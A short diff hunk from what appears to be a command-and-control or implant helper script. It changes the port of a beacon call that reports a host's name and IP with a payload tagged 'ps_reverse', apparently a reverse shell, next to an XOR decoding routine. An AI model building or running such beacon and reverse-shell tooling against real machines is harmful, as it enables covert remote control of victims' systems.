@@ -12,7 +12,7 @@ def xor_decode(data, key=XOR_KEY):
 def notify_flask_beacon(ip, hostname):
     try:
         payload = "ps_reverse"
-        requests.post("http://127.0.0.1:3000/beacon", json={
+        requests.post("http://127.0.0.1:8080/beacon", json={
             "hostname": hostname,
             "ip": ip,
             "payload": payload
